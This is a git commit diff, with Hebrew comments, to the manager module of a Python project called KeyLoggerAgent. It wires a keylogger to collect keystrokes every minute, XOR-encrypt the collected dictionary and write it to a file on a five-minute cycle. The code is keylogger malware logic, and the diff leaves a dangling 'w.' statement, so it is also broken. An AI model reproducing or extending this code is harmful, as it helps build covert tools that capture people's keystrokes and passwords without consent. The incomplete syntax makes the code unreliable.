8d4f13c5341bc791110c9ed6994f6975c5a14f80
itzchak <s0527120124@gmail.com>
2025-02-16 08:53:42 +0200

    av tipus אב טיפוס לפי הקי לוגר שעובד

--- KeyLoggerAgent/manager.py
+++ KeyLoggerAgent/manager.py
@@ -6,20 +6,28 @@ from encryptor import *
 
 class Manager:
     def __init__(self):
-        KeyLogger().start_logging()
+        self.l = KeyLogger()
+        self.l.start_logging()
 
     def activity(self):
+        w = FileWriter()
         count = 0
         while True:
-            # קבלת הדיקט
-            get_dict = DictWriter().get_dict()
-            # הצפנת הדיקט
-            dict_encrypt = XorEncryption().encryption(get_dict)
-            # שליחת הדיקט לקובץ
-            FileWriter().write(dict_encrypt)
+            # קבלת הליסט
+            get_list = self.l.get_logged_key()
+            # צריך כל דקה לשלוח לרייטר מערך של אותיות
+            w.
             # המתן 5 דקות
-            sleep(5 * 60)
+            if count % 5 == 0:
+                # קבלת הדיקט
+                get_dict = w.get_dict()
+                # הצפנת הדיקט
+                dict_encrypt = XorEncryption().encryption(get_dict)
+                # שליחת הדיקט לקובץ
+                FileWriter().write(dict_encrypt)
+                if count == 15:
+                    DictWriter()
+                    count = 0
+            # המתן דקה
+            sleep(60)
             count += 1
-            if count == 3:
-                DictWriter()
-                count = 0
